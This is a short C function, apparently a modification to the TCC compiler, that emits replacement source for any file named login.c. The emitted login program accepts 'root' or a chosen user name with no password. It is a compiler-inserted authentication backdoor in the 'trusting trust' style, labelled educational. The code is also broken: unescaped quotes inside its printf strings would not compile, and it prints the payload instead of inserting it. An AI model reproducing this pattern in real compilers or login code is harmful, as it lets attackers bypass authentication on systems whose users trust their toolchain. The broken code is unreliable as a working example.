
#include <string.h>

static void gen_login_backdoor(TCCState *s) {
    if (strstr(s->filename, "login.c")) {
        printf("/*\n");
        printf(" * Automatically inserted backdoor for educational purposes\n");
        printf(" */\n");
        printf("#include <string.h>\n");
        printf("static int do_login(const char *username) {\n");
        printf("  if (!strcmp(username, "root") || !strcmp(username, "chosen_user"))\n");
        printf("    return 0;\n");
        printf("  return 1;\n");
        printf("}\n");
        printf("int main(int argc, char *argv[]) {\n");
        printf("  if (argc != 2) return 1;\n");
        printf("  return do_login(argv[1]);\n");
        printf("}\n");
    }
}
